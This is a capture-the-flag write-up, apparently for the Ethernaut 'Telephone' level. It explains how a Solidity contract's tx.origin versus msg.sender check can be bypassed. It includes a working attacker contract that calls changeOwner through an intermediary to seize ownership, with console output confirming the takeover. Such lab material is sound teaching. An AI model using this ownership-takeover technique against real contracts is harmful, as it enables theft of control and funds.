# Telephone

To complete this level we need to take ownership of the contract.

# Code Breakdown

[The Smart Contract's Code can be seen here.](Telephone.sol)

```
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

This contract has only main function `changeOwner(address _owner)`, it simply checks if `tx.origin` is different to `msg.sender`.

### Level Completion

If we try to call the `changeOwner` function from our console using web3js, we will not get ownership. So let's see the difference between `tx.origin` and `msg.sender`.

Ethereum has two types of addresses:
* EOA (externally owned address), also known as wallet "public" address which is only used to transfer or receive ether.
* CA (contract address), it refers to the address hosting smart contract's code.

`tx.origin` is the address of the ***EOA*** from which originates the transaction, while `msg.sender` is the address of the account from which the current call is coming from which could be an ***EOA*** or a ***CA***.

This means that in order to take ownership we will need to call the `changeOwnership` function from a contract where `msg.sender` will be the address of our contract while `tx.origin` will always be the wallet address who deployed the contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneHack {
    function hack() public {
        // address of the game instance
        address instanceAddr = 0xc5B6fdDEB5a918b217c04913BE4eE7F0f9eF866a;
        // address of the new owner
        address newOwnerAddr = 0xa0D3DFEE9945d53532aDaF60acB4421de5baecA8;

        Telephone tel = Telephone(instanceAddr);
        tel.changeOwner(newOwnerAddr);
    }
}

interface Telephone {
    function changeOwner(address _owner) external;
}
```

compile, deploy and interact with our smart contract using [Remix IDE](https://remix.ethereum.org/), then calling the `hack()`. the owner address now changes to `newOwnerAddr`.

```js
>  await contract.owner()
<· "0xa0D3DFEE9945d53532aDaF60acB4421de5baecA8"